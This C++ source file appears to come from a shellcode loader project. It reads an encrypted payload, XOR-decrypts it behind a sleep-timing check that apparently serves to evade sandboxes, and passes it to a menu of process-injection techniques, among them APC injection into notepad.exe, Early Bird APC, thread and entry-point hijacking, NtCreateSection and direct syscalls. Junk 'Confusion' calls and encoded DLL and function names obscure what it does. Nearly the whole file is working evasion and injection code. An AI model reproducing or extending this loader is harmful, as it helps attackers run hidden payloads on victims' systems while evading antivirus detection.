//
// Created by au9u5t on 24-9-30.
//

#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include "Launch.h"


void Launch::au9u5tDecrypt() {
    std::ifstream inputFile{this->filePath, std::ios::binary};
    if (!inputFile) {
        std::cout << "Failed to open file!" << std::endl;
        return;
    }

    std::string encryptedData{std::istreambuf_iterator<char>(inputFile), std::istreambuf_iterator<char>()};
    inputFile.close();

    this->sleepTime = Cryptography::generateKey();
    this->minValue = this->sleepTime * 1000 - 500;
    this->maxValue = this->sleepTime * 1000 + 500;


    auto start_time = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(this->sleepTime * 1000));
    auto end_time = std::chrono::high_resolution_clock::now();

    auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
    auto time_diff = elapsed_time.count();


    auto i{this->NUMBER_OF_CYCLES};
    while (i--) {
        if (method == "6N_XOR") {
            this->func6N_XORPrep();
            auto diff{demo - time_diff};
            this->func6N_XOR(diff, encryptedData);
        } else if (method == "file_XOR") {
            this->funcFile_XOR(encryptedData);
        } else {
            std::cout << "Invalid encryption method!" << std::endl;
        }
        break;
    }
}

void Launch::func6N_XORPrep() {
    int intKey;
    try {
        intKey = std::stoi(key);
    }
    catch (std::invalid_argument &e) {
        std::cout << "Invalid key! key must be a number, and 6 digits long. your key: " << key << std::endl;
        return;
    }
    catch (std::out_of_range &e) {
        std::cout << "Key out of range!" << std::endl;
        return;
    } catch (...) {
        std::cout << "Invalid key!" << std::endl;
        return;
    }

    this->lessThan = intKey - 1;
    this->greaterThan = intKey + 1;
    this->demo = intKey;
}

void Launch::func6N_XOR(long long int &diff, std::string &encryptedData) {
    auto randomValue{Cryptography::decryptKey(diff, this->minValue, this->maxValue, this->lessThan, this->greaterThan)};

    if (lessThan < randomValue && randomValue < greaterThan) {
        auto randKey = std::to_string(randomValue);

        Confusion::generateAndSortArray();
        auto decryptedDate{Cryptography::x_o_r_EncryptDecrypt(encryptedData, randKey)};

        Confusion::generateAndSortArray();
        const auto *decryptedData = reinterpret_cast<const unsigned char *>(decryptedDate.c_str());
        auto byteLength = decryptedDate.length();

//        this->launchFunction(function_mode, decryptedData, byteLength);
        this->launchFunction(function_mode, decryptedData, byteLength);
    } else {
        std::cout << "Invalid random value!" << std::endl;
    }
}

void Launch::funcFile_XOR(string &encryptedData) {
    std::ifstream keyFile{key, std::ios::binary};
    if (!keyFile) {
        std::cout << "Failed to open key file!" << std::endl;
        return;
    }

    std::string keyData{std::istreambuf_iterator<char>(keyFile), std::istreambuf_iterator<char>()};
    keyFile.close();

    Confusion::generateAndSortArray();
    auto decryptedDate{Cryptography::x_o_r_EncryptDecrypt(encryptedData, keyData)};
    Confusion::generateAndSortArray();
    const auto *decryptedData = reinterpret_cast<const unsigned char *>(decryptedDate.c_str());
    auto byteLength = decryptedDate.length();

    this->launchFunction(function_mode, decryptedData, byteLength);


}

/*
 * 1. discard
 * 2. The full load mode is discarded and the corresponding load mode is used
 * */
//void Launch::launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
//    if (function_mode == "1") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 1");
//        this->startBase(MasterEncoderForDirectlyLoader::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "2") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 2");
//        this->startBase(MasterEncoderForApcLoader::function1, decryptedData, byteLength, "notepad.exe");
//        Confusion::generateAndSortArray();
//        while (true) {
//
//        }
//    } else if (function_mode == "3") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 3");
//        this->startBase(MasterEncoderForCreateThreatPoolWaitLoader::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "4") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 4");
//        this->startBase(MasterEncoderForDynamicLoader::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "5") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 5");
//        this->startBase(MasterEncoderForDynamicLoadPlus::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "6") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 6");
//        this->startBase(MasterEncoderForEarlyBirdAPC_InjetcLoad::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "7") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 7");
//        this->startBase(MasterEncoderForFiberLoad::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "8") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 8");
//        this->startBase(MasterEncoderForNtCreateSectionLoad::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//        while (true) {
//
//        }
//    } else if (function_mode == "9") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 9");
//        this->startBase(MasterEncoderForNtTestAlertLoad::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "10") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 10");
//        this->startBase(MasterEncoderForOEPHiijackInjectLoad::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "11") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 11");
//        this->startBase(MasterEncoderForSEHExceptLoad::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "12") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 12");
//        this->startBase(MasterEncoderForSyscallLoad::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "13") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 13");
//        this->startBase(MasterEncoderForThreadHiijack_InjectLoad::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//    } else if (function_mode == "14") {
//        Confusion::generateAndSortArray();
//        this->printMode("Function 14");
//        this->startBase(lib::function1, decryptedData, byteLength);
//        Confusion::generateAndSortArray();
//        std::cout << "Function 14 out" << std::endl;
//        while (true) {
//            Sleep(10000);
//            std::cout << "Function 14 in while_true" << std::endl;
//        }
//    } else {
//        std::cout << "Invalid func mode!" << std::endl;
//        return;
//    }
//}

void Launch::printMode(const string &mode) {
    std::cout << "in func: " << mode << std::endl;
}

void Launch::startBase(startFunction startFunction, const unsigned char *decryptedData, size_t &byteLength) {
    Confusion::generateAndSortArray();
    Confusion::generateAndSortArray();
    Confusion::generateAndTransformArray();
    startFunction(decryptedData, byteLength);
    Confusion::generateAndSortArray();
    Confusion::generateAndTransformArray();
    Confusion::generateAndSortArray();

}

void Launch::startBase(startFunction2 startFunction, const unsigned char *decryptedData, size_t &byteLength,
                       const string &name) {
    Confusion::generateAndSortArray();
    Confusion::generateAndSortArray();
    Confusion::generateAndTransformArray();
    startFunction(decryptedData, byteLength, name);
    Confusion::generateAndSortArray();
    Confusion::generateAndTransformArray();
    Confusion::generateAndSortArray();
}

dllAndFunction Launch::getDllNameAndFuncName(const string &function_mode) {
    std::string baseFuncNamePart1{R"(:,^XB&"W},dH?a}JAI>TAE`|)"}; // MasterEncoderFor
    std::string baseFuncNamePart2{R"([HNKB,dHB&JT?H%`)"}; // ::function1
    std::string fullFuncName{};
    std::string dName{};
    std::string funcName{};

    int intFunctionMode = std::stoi(function_mode);
    switch (intFunctionMode) {
        case 1: {
            dName = R"(}&JW>,+Y?*J=?a^I_K}Q?!`|)"; // DirectlyLoader
            funcName = R"(}&JW>,+Y?*J=?a^I>.(`)";
            break;
        }
        case 2: {
            dName = R"({.@H;,dO>,+Y:&hF>#dI?&U`)"; // DirectlyLoader
            funcName = R"({.@H:&hF>&"W)";
            break;
        }
        case 3: {
            dName = R"({b)J<.}J"&FW>,^Y'&hT?^BF/.}=?a^I_K}Q?!`|)"; // DirectlyLoader
            funcName = R"({b)J<.}J"&FW>,^Y'&hT?^BF/.}=?a^I>.(`)";
            break;
        }
        case 4: {
            dName = R"(}*JS<,ZN<YVT<,{S>&VQ)";
            funcName = R"(}*JS<,ZN<YVT<,}JAE`|)";
            break;
        }
        case 5: {
            dName = R"(}*JS<,ZN<YVT<,}{?*"X_K}Q?!`|)";
            funcName = R"(}*JS<,ZN<YVT<,}{?*"X)";
            break;
        }
        case 6: {
            dName = R"(},^W?*J#/.)I{"@$.YJS/K"Y<YVT<,{S>&VQ)";
            funcName = R"(},^W?*J#/.)I{"@$.YJS/K"Y<YVT<,{`)";
            break;
        }
        case 7: {
            dName = R"(}KJG>.)=?a^I_K}Q?!`|)";
            funcName = R"(}KJG>.)=?a^I)";
            break;
        }
        case 8: {
            dName = R"(:L}$AK"FB&":>,+Y/,hS:&hF>#dI?&U`)";
            funcName = R"(:L}$AK"FB&":>,+Y/,hS:&hF>!`|)";
            break;
        }
        case 9: {
            dName = R"(:L}'>.+Y{,VJAL}=?a^I_K}Q?!`|)";
            funcName = R"(:L}'>.+Y{,VJAL}=?a^I)";
            break;
        }
        case 10: {
            dName = R"(:Y"{;&JN/K^H/Zh)?KNJ<b}=?a^I_K}Q?!`|)";
            funcName = R"(:Y"{;&JN/K^H/YJS/K"HB%VT<,{`)";
            break;

        }
        case 11: {
            dName = R"('Y"(}.FH>.@Y:&hF>#dI?&U`)";
            funcName = R"('Y"(}.FH>.@Y:&hF>!`|)";
            break;
        }
        case 12: {
            dName = R"('bJX<a^Q?%VT<,{S>&VQ)";
            funcName = R"('bJX<a^Q?%VT<,{`)";
            break;
        }
        case 13: {
            dName = R"("&FW>,^I;&JN/K^H/Zh)?KNJ<b}=?a^I_K}Q?!`|)";
            funcName = R"("&FW>,^I;&JN/K^H/Zh)?KNJ<b}=?a^I)";
            break;
        }
        default: {
            dName = R"(}&JW>,+Y?*J=?a^I_K}Q?!`|)"; // DirectlyLoader
            funcName = R"(}&JW>,+Y?*J=?a^I>.(`)";
        }
    }
    fullFuncName = augustEncryption::decode(baseFuncNamePart1) +
                   augustEncryption::decode(funcName) +
                   augustEncryption::decode(baseFuncNamePart2);
    return {augustEncryption::decode(dName), fullFuncName};
}

std::string Launch::strXor(const string &data) {
    auto temp = data;
    for (auto i{0}; i < data.length(); i++) {
        temp[i] = data[i] ^ i;
    }
    return temp;
}

void Launch::launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
    auto dllAndFuncName = this->getDllNameAndFuncName(function_mode);
    auto dllName = dllAndFuncName.first;
    auto funcName = dllAndFuncName.second;
    auto baseName{"../lib/"};
    if (function_mode == "14") {
        Confusion::generateAndSortArray();
        this->printMode("Function 14");
        this->startBase(lib::function1, decryptedData, byteLength);
        Confusion::generateAndSortArray();
        std::cout << "Function 14 out" << std::endl;
        while (true) {
            Sleep(10000);
            std::cout << "Function 14 in while_true" << std::endl;
        }
    } else {
        loadLibrary::runFuncFromDll(baseName+dllName, funcName, decryptedData, byteLength);
    }
}

